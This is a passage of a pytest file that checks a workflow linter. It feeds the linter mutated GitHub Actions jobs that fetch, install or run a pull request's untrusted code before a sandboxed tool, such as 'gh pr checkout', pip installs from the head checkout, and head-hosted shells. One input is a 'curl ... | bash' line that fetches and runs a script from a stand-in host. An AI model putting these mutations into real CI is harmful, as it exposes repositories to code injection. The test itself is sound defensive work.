        "BASE_SHA is assigned more than once",
    ),
    (
        "run: BASE_SHA is read again after the check",
        _replace("proof-run", SHA_CHECK, SHA_CHECK + "\nread -r BASE_SHA < head/sha"),
        "BASE_SHA is assigned more than once",
    ),
    (
        "run: BASE_SHA is appended to after the check",
        _replace("proof-run", SHA_CHECK, SHA_CHECK + "\nBASE_SHA+=0"),
        "BASE_SHA is assigned more than once",
    ),
    (
        "run: a step sets BASE_SHA in env",
        _insert_before_lc("proof-run", {"env": {"BASE_SHA": "x"}, "run": "true"}),
        "BASE_SHA is assigned more than once",
    ),
    # -- the pull request's code fetched by a step, not by the head checkout ------------------------------------- #
    *[
        (
            f"{job}: {command}",
            _insert_before_lc(job, {"run": command}),
            "fetches the pull request's code itself",
        )
        for job in ("proof-plan", "proof-run")
        for command in (
            "gh pr checkout ${{ github.event.pull_request.number }}",
            "gh pr checkout 7",
            "git fetch origin pull/7/head:pr",
            "git fetch origin refs/pull/${{ github.event.pull_request.number }}/merge",
        )
    ],
    # -- what only the list of shipped steps catches: a path the rules above do not name -------------------------- #
    *[
        (f"{job}: {command}", _insert_before_lc(job, {"run": command}), "not a run step the page ships")
        for job in ("proof-plan", "proof-run")
        for command in (
            "pip install -r */requirements-dev.txt",
            "find . -name 'requirements*.txt' -exec pip install -r {} +",
            'cd "$(dirname "$GITHUB_WORKSPACE/h")"/he* && make',
            'WS=$GITHUB_WORKSPACE; pip install -r "$WS/head/requirements-dev.txt"',
        )
    ],
    (
        "plan: the workspace named through an env expression and used as a variable",
        _insert_before_lc(
            "proof-plan",
            {"env": {"WS": "${{ github.workspace }}"}, "run": 'pip install -r "$WS/head/requirements-dev.txt"'},
        ),
        "is an expression the page does not use",
    ),
    (
        "run: an expression that builds a head path",
        _insert_before_lc(
            "proof-run", {"working-directory": "${{ format('{0}/head', runner.workspace) }}", "run": "true"}
        ),
        "is an expression the page does not use",
    ),
    (
        "run: a step added after lc",
        _append("proof-run", {"run": "curl -s https://example.test/x.sh | bash"}),
        "not a run step the page ships",
    ),
    (
        "report: a step added after lc",
        _append("proof-report", {"run": "echo hi"}),
        "not a run step the page ships",
    ),
    *[
        (
            f"{job}: the {what} step is deleted",
            lambda jobs, job=job, key=key: jobs[job]["steps"].remove(_step_with(job, key)(jobs)),
            "no longer ships the run step",
        )
        for job, what, key in (
            ("proof-run", "bubblewrap install", "install -y bubblewrap"),
            ("proof-run", "base install", BASE_SHOW),
            ("proof-plan", "uv sync", "uv sync"),
            ("proof-report", "report", "lc review proof report"),
        )
    ],
    (
        "plan: a shipped script edited",
        _replace("proof-plan", "uv sync --frozen", "uv sync --frozen --all-extras"),
        "not a run step the page ships",
    ),
    (
        "run: an apt package added to the bubblewrap step",
        _replace("proof-run", "install -y bubblewrap", "install -y bubblewrap ./head/x.deb"),
        "not a run step the page ships",
    ),
    (
        "plan: an action the page does not ship",
        _insert_before_lc("proof-plan", {"uses": "someone/setup@v1"}),
        "an action the page does not ship",
    ),
    (
        "plan: plan reads a state file, not the pull request",
        _replace("proof-plan", "--pr ${{ github.event.pull_request.number }}", "--state-file s.json"),
        "must read the pull request with --pr",
    ),
    # -- default shells ---------------------------------------------------------------------------------------- #
    (
        "run: the job's default shell is a script of the head checkout",
        lambda jobs: jobs["proof-run"].__setitem__("defaults", {"run": {"shell": "head/shell.sh {0}"}}),
        "default shell is in the head checkout",
    ),
    (
        "plan: the job's default shell is bash on a file of the head checkout",
        lambda jobs: jobs["proof-plan"].__setitem__(
            "defaults", {"run": {"shell": "bash --rcfile ${{ github.workspace }}/head/rc {0}"}}
        ),
        "default shell is in the head checkout",
    ),
    # -- what a step before (or after) lc installs, builds or sources ---------------------------------------------- #
    *[
        (f"{job}: {command}", _insert_before_lc(job, {"name": "Install", "run": command}), "the head checkout")
        for job in ("proof-plan", "proof-run")
        for command in INTO_HEAD
    ],
    (
        "run: a step after lc builds in the head checkout",
        _append("proof-run", {"run": "make -C head clean"}),
        "the head checkout",
    ),
    (
        "run: the dependency install reads the head's requirements",
        _replace("proof-run", "-r base-req.txt", "-r head/requirements-dev.txt"),
        "the head checkout",
    ),
    (
        "run: the base file is read from the head checkout by another git command",
        _replace("proof-run", '-C "$GITHUB_WORKSPACE/head" show', '-C "$GITHUB_WORKSPACE/head" checkout'),
        "the head checkout",
    ),
    (
        "run: the one allowed git show takes an option",
        _replace("proof-run", '-C "$GITHUB_WORKSPACE/head" show', '-C "$GITHUB_WORKSPACE/head" show --textconv'),
        "the head checkout",
    ),
    (
        "run: lc is given another path of the head checkout",
        _replace("proof-run", "--toolchain /opt/hostedtoolcache", "--toolchain head/venv"),
        "the head checkout",
    ),
    (
        "run: setup-python reads the head's .python-version",
        _insert_before_lc("proof-run", {"uses": SETUP_PYTHON, "with": {"python-version-file": "head/.python-version"}}),
        "the head checkout",
    ),
    (
        "plan: setup-python caches from the head's lockfile",
        _insert_before_lc(
            "proof-plan",
            {"uses": SETUP_PYTHON, "with": {"python-version": "3.12", "cache-dependency-path": "./head/uv.lock"}},
        ),
        "the head checkout",
    ),
    (
        "run: the shipped setup-python reads the head's .python-version",
        lambda jobs: _with(next(s for s in _steps(jobs["proof-run"]) if _uses(s, "actions/setup-python"))).__setitem__(
            "python-version", "${{ github.workspace }}/head/.python-version"
        ),
        "the head checkout",
    ),
    (
        "run: a local action of the head checkout",
        _insert_before_lc("proof-run", {"uses": "./head/.github/actions/setup"}),
        "an action from the head checkout",
    ),
    (
        "plan: a step's environment names the head checkout",
        _insert_before_lc("proof-plan", {"env": {"UV_PROJECT": "./head"}, "run": "true"}),
        "the head checkout",
    ),
    (
        "run: a step's shell is a script of the head checkout",
        _insert_before_lc("proof-run", {"shell": "head/shell.sh {0}", "run": "true"}),
        "the head checkout",
    ),
    # -- the commit the base install reads, against the commit lc diffs from --------------------------------------- #
    (
        "run: the base install reads the base branch's tip, from env",
        _old_base_install,
        "the base branch's tip",
    ),
    (
        "run: the base install is not read from the plan",
        _replace("proof-run", PLAN_BASE, "BASE_SHA=$GITHUB_BASE_REF"),
        "must read BASE_SHA from the plan",
    ),
    (
        "run: the base install reads another file than the plan lc runs with",
        _replace("proof-run", "$GITHUB_WORKSPACE/lemoncrow-proof-plan.json", "$GITHUB_WORKSPACE/other.json"),
        "not the plan lc runs with",
    ),
    ("run: the plan is downloaded after the install", _download_after_install, "is not downloaded before"),
    (
        "run: BASE_SHA is not validated",
        _replace("proof-run", SHA_CHECK, "true"),
        "does not validate BASE_SHA",
    ),
    (
        "run: BASE_SHA is validated only after it is used",
        _validate_after_use,
        "does not validate BASE_SHA",
    ),
    (
        "run: another step names the base branch's tip",
        _insert_before_lc("proof-run", {"env": {"BASE": "${{ github.event.pull_request.base.sha }}"}, "run": "true"}),
        "the base branch's tip",
    ),
]


@pytest.mark.parametrize(("label", "mutate", "expected"), MUTATIONS, ids=[m[0] for m in MUTATIONS])
def test_each_way_back_to_running_the_pull_request_before_lc_is_caught(
    label: str, mutate: Callable[[Jobs], None], expected: str
) -> None:
    jobs = copy.deepcopy(_jobs())
    mutate(jobs)
    found = violations(jobs, _workflow())
    assert any(expected in line for line in found), (label, found)


@pytest.mark.parametrize(
    "scope",
    [
        {"defaults": {"run": {"working-directory": "head"}}},
        {"defaults": {"run": {"working-directory": "./head/sub"}}},
        {"defaults": {"run": {"working-directory": "${{ github.workspace }}/head"}}},
        {"env": {"PYTHONPATH": "head"}},
        {"defaults": {"run": {"shell": "head/shell.sh {0}"}}},
        {"defaults": {"run": {"shell": "bash --rcfile $PWD/head/rc {0}"}}},
    ],
    ids=["head", "./head/sub", "github.workspace", "env", "shell", "shell-pwd"],
)
def test_a_workflow_level_default_in_the_head_checkout_is_caught(scope: dict[str, Any]) -> None:
    """The jobs the page adds sit in the reader's workflow, and what that sets for every job reaches them."""

    workflow = {**copy.deepcopy(_workflow()), **scope}
    found = violations(_jobs(), workflow)
    assert any(line.startswith("workflow: ") and "the head checkout" in line for line in found), found
    assert violations(_jobs(), {**_workflow(), "defaults": {"run": {"working-directory": "docs"}}}) == []


def test_the_workflow_this_page_used_to_ship_is_flagged_everywhere() -> None:
    """Head in the workspace root, ``setup-uv`` bare: the shape that ran the pull request before the sandbox."""

    jobs = copy.deepcopy(_jobs())
    for job in JOBS:
        for step in _steps(jobs[job]):
            if _uses(step, "astral-sh/setup-uv"):
                step.pop("with")
            if _is_head_checkout(step):
                _with(step).pop("path")
    found = violations(jobs, _workflow())
    for job in JOBS:
        assert any(line.startswith(f"{job}: setup-uv must set enable-cache") for line in found), job
    for job in ("proof-plan", "proof-run"):
        assert any(
            line.startswith(f"{job}: the head checkout must go into its own subdirectory") for line in found
        ), job
